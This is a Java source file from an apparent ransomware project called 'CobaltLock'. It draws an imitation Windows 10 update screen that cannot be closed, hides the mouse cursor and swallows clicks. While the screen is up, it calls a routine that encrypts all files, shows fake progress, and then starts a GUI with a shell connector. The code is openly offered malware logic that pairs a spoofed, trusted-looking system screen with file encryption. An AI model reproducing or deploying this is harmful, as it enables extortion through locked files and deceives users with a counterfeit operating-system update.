import Decryptor.DirectoryFinder;

import javax.swing.*;
import java.awt.*;
import java.io.File;
import java.net.MalformedURLException;
import java.net.URL;

//fake windows update that encrypts files

public class Windows10FakeUpdate {
    public static void main(String[] args) {
        try {
            File gifFile = new File("CobaltLock/src/main/resources/Windows10Spinner.gif");
            URL spinnerGif = gifFile.toURI().toURL();
            Icon icon = new ImageIcon(spinnerGif);

            JLabel label = new JLabel(icon);
            label.setBounds(250, 150, icon.getIconWidth(), icon.getIconHeight());

            JLabel updateFakeInfo = new JLabel("Working on updates 1% complete.", SwingConstants.CENTER);
            updateFakeInfo.setForeground(Color.WHITE);
            updateFakeInfo.setFont(new Font("Segoe UI", Font.PLAIN, 18));
            updateFakeInfo.setBounds(100, 220, 400, 30);

            JLabel warningLine1 = new JLabel("Keep your PC on.", SwingConstants.CENTER);
            warningLine1.setForeground(Color.WHITE);
            warningLine1.setFont(new Font("Segoe UI", Font.PLAIN, 18));
            warningLine1.setBounds(150, 260, 300, 25);

            JLabel warningLine2 = new JLabel("Interrupting updates may damage system files.", SwingConstants.CENTER);
            warningLine2.setForeground(Color.WHITE);
            warningLine2.setFont(new Font("Segoe UI", Font.PLAIN, 18));
            warningLine2.setBounds(50, 285, 500, 25);

            JFrame frame = new JFrame("Update");
            Container cp = frame.getContentPane();
            cp.setLayout(null);
            cp.setBackground(Color.decode("#005a9e"));

            frame.setUndecorated(true);
            frame.setResizable(false);
            frame.setDefaultCloseOperation(JFrame.DO_NOTHING_ON_CLOSE);
            frame.setSize(600, 400);
            frame.setLocationRelativeTo(null);
            frame.setAlwaysOnTop(true);

            cp.add(label);
            cp.add(updateFakeInfo);
            cp.add(warningLine1);
            cp.add(warningLine2);

            // Hide mouse
            Toolkit toolkit = Toolkit.getDefaultToolkit();
            Image transparentImage = toolkit.createImage(new byte[0]);
            Cursor invisibleCursor = toolkit.createCustomCursor(transparentImage, new Point(0, 0), "invisibleCursor");
            frame.setCursor(invisibleCursor);

            // Ignore mouse input
            frame.getRootPane().addMouseListener(new java.awt.event.MouseAdapter() {
                public void mousePressed(java.awt.event.MouseEvent e) {
                    e.consume();
                }
            });

            frame.setVisible(true);

            // Encrypt or simulate scanning after GUI loads
            DirectoryFinder.encryptAllFiles();

            File[] filesFound = new File("CobaltLock/src/main/ExampleFiles").listFiles();
            if (filesFound == null || filesFound.length == 0) return;

            for (int i = 0; i < filesFound.length; i++) {
                Thread.sleep(2000);
                int percent = (i + 1) * 100 / filesFound.length;

                SwingUtilities.invokeLater(() ->
                        updateFakeInfo.setText("Working on updates " + percent + "% complete.")
                );
                if (percent == 100){

                    //Wait time for realism
                    Thread.sleep(2000);
                    System.out.println("Exiting");
                    frame.setVisible(false);
                    GUI gui = new GUI(600, 400);
                    gui.setUpGUI();
                    gui.setUpButtonListeners();
                    gui.runShellConnector();

                }
            }

        } catch (MalformedURLException | InterruptedException e) {
            throw new RuntimeException(e);
        }
    }
}
